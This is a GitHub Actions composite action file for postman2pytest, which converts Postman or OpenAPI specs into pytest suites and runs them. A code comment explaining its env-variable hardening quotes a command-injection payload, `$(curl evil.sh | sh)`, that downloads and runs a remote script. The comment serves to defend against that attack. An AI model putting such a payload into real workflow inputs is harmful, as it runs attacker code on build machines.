name: postman2pytest
description: Convert a Postman collection or OpenAPI spec into pytest tests and run them in one workflow step.
author: Mikhail Golikov

branding:
  icon: repeat
  color: green

inputs:
  collection:
    description: Path to the Postman Collection v2.1 JSON, or an OpenAPI 3.x spec when input-format is openapi.
    required: true
  input-format:
    description: Input format, either postman or openapi.
    required: false
    default: postman
  out:
    description: Where to write the generated pytest file.
    required: false
    default: generated_tests/test_api.py
  base-url:
    description: Base URL the generated tests call. Exported as BASE_URL for the test run.
    required: false
    default: ""
  env-file:
    description: Path to a Postman environment export. Non-secret variables are inlined, secrets stay as env lookups.
    required: false
    default: ""
  filter-folder:
    description: Only convert requests inside this Postman folder.
    required: false
    default: ""
  run-tests:
    description: Run the generated suite after converting. Set to false to generate only.
    required: false
    default: "true"
  pytest-args:
    description: >-
      Extra arguments passed to pytest, split on whitespace, for example "-k smoke --maxfail=1".
      Quoted arguments are not supported: "-m 'not slow'" arrives as two words.
    required: false
    default: ""
  python-version:
    description: Python version used to convert and run.
    required: false
    default: "3.12"
  version:
    description: Version of postman2pytest to install. Defaults to the latest release on PyPI.
    required: false
    default: ""
  install:
    description: >-
      Where postman2pytest comes from. "pypi" installs the release; "skip" assumes it is
      already on PATH, which is how this repository smoke-tests the action against its own
      checkout instead of against the last published version.
    required: false
    default: pypi

outputs:
  tests-path:
    description: Path of the generated pytest file.
    value: ${{ steps.convert.outputs.tests-path }}
  tests-dir:
    description: >-
      Directory holding the generated suite. Upload this rather than tests-path: collections
      with auth headers also produce a sibling conftest.py, and the suite does not collect without it.
    value: ${{ steps.convert.outputs.tests-dir }}
  test-count:
    description: Number of generated test functions.
    value: ${{ steps.convert.outputs.test-count }}

runs:
  using: composite
  steps:
    - name: Set up Python
      uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
      with:
        python-version: ${{ inputs.python-version }}

    # Every input reaches bash through env, never through ${{ }} inside a run
    # block. Expression results are pasted into the script text before bash
    # parses it, so quoting in the script cannot contain them: a collection
    # named `$(curl evil.sh | sh)` would execute. Read as "$COLLECTION" it is
    # only ever data.
    - name: Install postman2pytest
      if: inputs.install != 'skip'
      shell: bash
      env:
        VERSION: ${{ inputs.version }}
      run: |
        set -euo pipefail
        python -m pip install --upgrade pip
        if [ -n "$VERSION" ]; then
          pip install "postman2pytest==${VERSION}" pytest requests
        else
          pip install postman2pytest pytest requests
        fi

    - name: Convert collection
      id: convert
      shell: bash
      env:
        COLLECTION: ${{ inputs.collection }}
        OUT: ${{ inputs.out }}
        INPUT_FORMAT: ${{ inputs.input-format }}
        ENV_FILE: ${{ inputs.env-file }}
        FILTER_FOLDER: ${{ inputs.filter-folder }}
      run: |
        set -euo pipefail
        args=(--collection "$COLLECTION" --out "$OUT" --input-format "$INPUT_FORMAT")
        if [ -n "$ENV_FILE" ]; then args+=(--env "$ENV_FILE"); fi
        if [ -n "$FILTER_FOLDER" ]; then args+=(--filter-folder "$FILTER_FOLDER"); fi
        postman2pytest "${args[@]}"

        if [ ! -f "$OUT" ]; then
          echo "postman2pytest reported success but ${OUT} does not exist" >&2
          exit 1
        fi
        # Counted from the generated file rather than parsed from log output:
        # log wording is free to change, the def-line shape is the contract.
        # The template emits one top-level `def test_...` per request; if that
        # ever changes to async, class-nested or parametrised tests, count with
        # `pytest --collect-only` instead.
        count=$(grep -c "^def test_" "$OUT" || true)
        count=${count:-0}
        {
          echo "tests-path=${OUT}"
          echo "tests-dir=$(dirname "$OUT")"
          echo "test-count=${count}"
        } >> "$GITHUB_OUTPUT"
        echo "Generated ${count} test(s) into ${OUT}"

    # Anything other than an explicit "false" runs the suite. The opposite
    # test would turn a typo such as "True" into a silent skip, and an action
    # that reports success without running the tests is worse than one that
    # fails.
    - name: Run generated tests
      if: inputs.run-tests != 'false'
      shell: bash
      env:
        BASE_URL: ${{ inputs.base-url }}
        OUT: ${{ inputs.out }}
        PYTEST_ARGS: ${{ inputs.pytest-args }}
      run: |
        set -euo pipefail
        read -ra extra <<< "$PYTEST_ARGS"
        pytest "$OUT" "${extra[@]}"
